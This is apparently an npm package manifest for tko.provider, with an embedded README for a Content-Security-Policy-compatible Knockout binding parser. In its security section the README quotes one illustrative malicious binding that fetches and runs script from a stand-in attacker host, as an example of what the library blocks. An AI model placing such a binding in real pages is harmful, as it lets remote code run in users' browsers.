{
  "version": "0.5.5",
  "author": {
    "name": "Brian M Hunt",
    "email": "brianmhunt@gmail.com"
  },
  "license": "MIT",
  "name": "tko.provider",
  "devDependencies": {
    "chai": "^3.5.0",
    "gulp": "^3.9.1",
    "karma-chai": "^0.1.0",
    "karma-mocha": "^1.1.1",
    "karma-sinon": "^1.0.5",
    "mocha": "^3.0.2",
    "sinon": "^1.17.5",
    "tko-policy": "github:knockout/tko-policy",
    "tko.bind": "github:knockout/tko.bind",
    "tko.binding.core": "github:knockout/tko.binding.core",
    "tko.computed": "github:knockout/tko.computed",
    "tko.observable": "github:knockout/tko.observable"
  },
  "files": [
    "dist/",
    "src/",
    "index.js",
    "./*.ya?ml"
  ],
  "main": "dist/tko.provider.js",
  "jsnext:main": "index.js",
  "homepage": "https://github.com/brianmhunt/knockout-secure-binding",
  "licenses": {
    "type": "MIT",
    "url": "http://brianmhunt.mit-license.org/"
  },
  "repository": {
    "type": "git",
    "url": "git://github.com/brianmhunt/knockout-secure-binding.git"
  },
  "dependencies": {
    "tko.observable": "github:knockout/tko.observable",
    "tko.utils": "github:knockout/tko.utils"
  },
  "scripts": {
    "test": "./node_modules/karma/bin/karma start --single-run"
  },
  "gitHead": "5b39e12df9fd1caeb68aceec9e2eef80b9f5aada",
  "readme": "tko.provider\n============\n\n [![CircleCI](https://circleci.com/gh/knockout/tko.provider.svg?style=svg)](https://circleci.com/gh/knockout/tko.provider)\n\n\ntko.provider is a binding provider for [Knockout](http://knockoutjs.com), namely it parses HTML attributes and converts them to handlers of bidirectional updates.\n\ntko.provider can be used with a [Content Security Policy](http://www.w3.org/TR/CSP/).\n\nThis provider differs from Knockout's 3.X and prior default binder, which uses `new Function` to parse bindings, as discussed in [knockout/knockout#903](https://github.com/knockout/knockout/issues/903).\n\nFor more information, see the [blog post about knockout-secure-binding](http://brianmhunt.github.io/articles/knockout-plus-content-security-policy/).\n\n\nGetting started\n---\n\n\n### Installing\n\nYou can get KSB from `bower` with:\n\n```\nbower install knockout-secure-binding\n```\n\nUsing `npm` with:\n\n```\nnpm install knockout-secure-binding\n```\n\nSave this to their respective settings with `--save-dev` or `--save`.\n\n### Using (script)\n\nThen include it in your project with a `script` tag and a property `secureBindingsProvider` will be added to the `ko` object. I.e.\n\n```\n<script src='knockout-secure-binding.js'></script>\n```\n\nKSB is a near drop-in replacement for the standard Knockout binding provider when provided the following options:\n\n```\nvar options = {\n   attribute: \"data-bind\",        // default \"data-sbind\"\n   globals: window,               // default {}\n   bindings: ko.bindingHandlers,  // default ko.bindingHandlers\n   noVirtualElements: false       // default true\n};\nko.bindingProvider.instance = new ko.secureBindingsProvider(options);\n```\n\nHaving called the above, when you run `ko.applyBindings` the knockout bindings will be parsed by KSB and the respective bindings' `valueAccessors` will be KSB instead of Knockout's own binding engine (which at its core uses the `new Function`, which is barred by CSP's `eval` policy).\n\nWhen the `attribute` option is not provided the default binding for KSB is `data-sbind`. You can see more options below. By default KSB the `globals` object for KSB is an empty object. The options are described in more detail below.\n\n\n### Using (AMD Loader)\n\nIf you are using an AMD loader, then KSB is exported, and you should be able to\nload it like this:\n\n```\nrequire([\"knockout\", \"knockout-secure-binding\"], function (ko, ksb) {\n  // Show all options, more restricted setup than the Knockout regular binding.\n  var options = {\n     attribute: \"data-sbind\",      // ignore legacy data-bind values\n     globals: {},                  // no globals\n     bindings: ko.bindingHandlers, // still use default binding handlers\n     noVirtualElements: true       // no virtual elements\n  };\n\n  ko.bindingProvider.instance = new ksb(options);\n  /* ... */\n});\n```\n\n\nHave a look at the example in [knockout-classBindingProvider](https://github.com/rniemeyer/knockout-classBindingProvider)) for more info.\n\n\n\nThe `sbind` language\n---\n\nThe language used in KSB in bindings is a superset of JSON but a subset of Javascript. I will call it the *sbind* language, for convenience.\n\nSbind language is closer to JSON than Javascript, so it's easier to describe its differences by comparing it to JSON. The sbind language differs from JSON in that:\n\n1. it understands the `undefined` keyword;\n2. it looks up variables on `$data` or `$context` or `globals` (in that order);\n3. functions can be called (but do not accept arguments);\n4. top-level functions are called with `this` set to an object with the following keys: `$data`, `$context`, `globals`, `$element`, corresponding to the state for the respective element bound. †\n5. a subset of Javascript expressions are available (see below);\n6. observables that are part of expressions are automatically unwrapped for convenience.\n\n† Note that this is a deviation from the ordinary Knockout behaviour, where\n`this` would be `window` (unless the function is otherwise bound).\n\nKSB provider uses Knockout's built-in bindings, so `text`, `foreach`, and all the others should work as expected. It also works with virtual elements.\n\nThis means that the following ought to work as expected:\n\n```\n<span data-bind='text: 42'></span>\n<span data-bind='text: obs'></span>\n<span data-bind='text: obs()'></span>\n<span data-bind='text: obs_a() || obs_b()'></span>\n\n<!-- The following are unwrapped because they are part of an expression-->\n<span data-bind='text: obs_a || obs_b'></span>\n\n<span data-bind='text: 1 + 2 / (obs % 4)'></span>\n<span data-bind='css: { class_name: obs_a <= 400 }'></span>\n<a data-bind='click: fn, attr: { href: obs }'></a>\n```\n\nThe sbind language understands both compound identifiers (e.g. `obs()[1].member()` and expressions (e.g. `a + b * c`)). A full list of operators supported is below. Check out the `spec/knockout_secure_binding_spec.js` for a more thorough list of expressions that work as expected.\n\nThere are some restrictions on the sbind language. These include:\n\n- it will not dereference static objects so the following will not work: `{ a: 1 }[obs()]`.\n- functions do not accept arguments.\n\n\nSecurity implications\n---\n\nAs mentioned, one cannot use the default Knockout binding provider when a\nContent Security Policy prohibits unsafe evaluations (`eval`,\n`new Function`, `setTimeout(string)`, `setInterval(string)`).\n\nProhibiting unsafe evaluations with a Content Security Policy substantially substantially reduces the risk\nof a cross-site scripting attack. See for example [Preventing XSS with Content Security Policy](http://benvinegar.github.io/csp-talk-2013/).\n\nBy using KSB in place of the regular binding provider one can continue to use\nKnockout in an environment with a Content Security Policy. This includes for example [Chrome web apps](http://developer.chrome.com/apps/contentSecurityPolicy.html).\n\nIndependent of a Content Security Policy, KSB can help prevent the execution of arbitrary code in a Knockout binding. A malicious script such as\n`text: $.getScript('http://a.bad.place.example.com/a.bad.bad.thing')` could be executed in Knockout on a DOM element that is having bindings applied. However with CSP and KSB you can prevent this script from executing by/because:\n\n1. Not including `$` as a global;\n2. Functions in KSB do not accept arguments;\n3. You can use a CSP white-list, which prevents accessing the (presumably unknown) host `a.bad.place`.\n\n\nOptions\n---\n\nThe `ko.secureBindingsProvider` constructor accepts one argument,\nan object that may contain the following options:\n\n\n| Option | Default | Description |\n| ---: | :---: | :--- |\n| attribute | `data-sbind` | The binding value on attributes |\n| globals | `{}` | Where variables are looked up if not on `$context` or `$data` |\n| bindings | `ko.bindingHandlers` | The bindings KO will use with KSB |\n| noVirtualElements | `false` | Set to `true` to disable virtual element binding |\n\nFor example, `ko.secureBindingsProvider({ globals: { \"$\": jQuery }})`.\n\n\nExpressions\n---\n\nKSB supports some [Javascript operations](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence#Table), namely:\n\n| Type | Operators  |\n| ---: | :-------- |\n| Negation | `!` `!!`        |\n| Multiplication | `*` `/` `%`      |\n| Addition | `+` `-` |\n| Comparison | `<` `<=` `>` `>=` |\n| Equality | `==` `!=` `===` `!==` |\n| Logic | `&&` <code>&#124;&#124;</code> |\n| Bitwise | `&` `^` <code>&#124;</code> |\n\nNotes:\n\n1. Observables in expressions are unwrapped as a convenience so `text: a > b` will unwrap both `a` and `b` if they are observables. It will not unwrap for membership i.e. `a.property` will return the `property` of the observable (`a.property`), not the property of the observable's unwrapped value (`ko.unwrap(a).property`). If the variable referred to is not part of an expression (e.g. `text: a`) then the variable will not be unwrapped before being passed to a binding. This is the expected behaviour.\n\n2. While negation and double-negation are supported, trible negation (`!!!`) will not work as expected.\n\n3. When you use equality operators in *sbind* (`==` and `!=`), the operation performed will be their [non-evil twins (`===` and `!==`)](http://stackoverflow.com/a/359509/19212). The following are exactly the same: `data-sbind: x == y` and `data-sbind: x === y`. As Douglas Crockford puts it, in [Javascript: The Good Parts](http://rads.stackoverflow.com/amzn/click/0596517742): “My advice is to never use the evil twins.”\n\n\nTests\n---\n\nYou can run a standalone server with `npm test`. It will\nprint the URL for the server to the console. You can connect\nto it with any browser and the tests will be executed.\n\nAutomated tests with `chromedriver` can be initiated with\n`npm start`.\n\nYou will need to independently start `chromedriver` with\n`chromedriver --url-base=/wd/hub --port=4445`.\n\n- Compile with [`gulp`](http://gulpjs.com/).\n- Run a test server with `./node_modules/karma/bin/karma start`.\n- Run tests with `npm test`\n\nMake sure you have [installed `gulp`](https://github.com/gulpjs/gulp/blob/master/docs/getting-started.md) with `npm install -g gulp`.\n\nRequires\n---\n\nKnockout 2.0+\n\nKSB may use ES5 functions, including (but perhaps not limited to):\n\n- `Object.defineProperty`\n- `Object.keys`\n- `String.trim`\n\n\nPerformance\n---\n\nKSB seems to be comparable in performance to Knockout's regular bindings. Here\nis a [jsPerf example](http://jsperf.com/knockout-secure-binding), which seems to indicate KSB is around 7–10% slower, with a margin of error of ±10%.\n\nI would expect the KSB parser to be slower than the native Javascript parser, even though it does less. The expressions and identifiers looked up in KSB have\na proportionately higher number of function calls per expression and dereference.\n\nSo one would expect KSB to be slower than the native bindings. That said, the portion of Knockout that KSB sits in is not a big bottleneck for performance. Individual bindings and especially their respective DOM operations seem to be a much greater concern.\n\n\nHow it works\n---\n\nKSB runs a one-pass parser on the bindings’ text and generates an array of identifier dereferences and a lazily generated syntax tree of expressions.\n\nThe identifier dereferences for something like `<span data-bind='x: a.b[\"c\"]()'></span>` will look like (or convert into) this:\n\n```\n[\n  function (x) { return x['b'] },\n  function (x) { return x['c'] },\n  function (x) { return x() },\n]\n```\n\nWhen (if) the `x` binding calls its `valueAccessor` argument the identifier will be returned as the root value (`a`, presumably an object) then each of the dereference functions.\n\nThe expression tree is straightforward and for something like `1 + 4 - 8` it looks like this:\n\n```\n1     4\n \\   /\n  (+)     8\n    \\    /\n     (-)\n```\n\nAll to say, there is no real magic (or dragons) here.\n\n\nLICENSE\n---\n\nThe MIT License (MIT)\n\nCopyright (c) 2013–2014 Brian M Hunt\n\nPermission is hereby granted, free of charge, to any person obtaining a\ncopy of this software and associated documentation files (the \"Software\"),\nto deal in the Software without restriction, including without limitation\nthe rights to use, copy, modify, merge, publish, distribute, sublicense,\nand/or sell copies of the Software, and to permit persons to whom the\nSoftware is furnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\nTHE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\nFROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\nDEALINGS IN THE SOFTWARE.\n",
  "readmeFilename": "README.md",
  "description": "tko.provider ============",
  "bugs": {
    "url": "https://github.com/brianmhunt/knockout-secure-binding/issues"
  },
  "_id": "tko.provider@0.5.5",
  "_shasum": "050c79b5001b9b1d28ad03d979a19d4869d82e13",
  "_from": "knockout/tko.provider",
  "_resolved": "git://github.com/knockout/tko.provider.git#5b39e12df9fd1caeb68aceec9e2eef80b9f5aada"
}
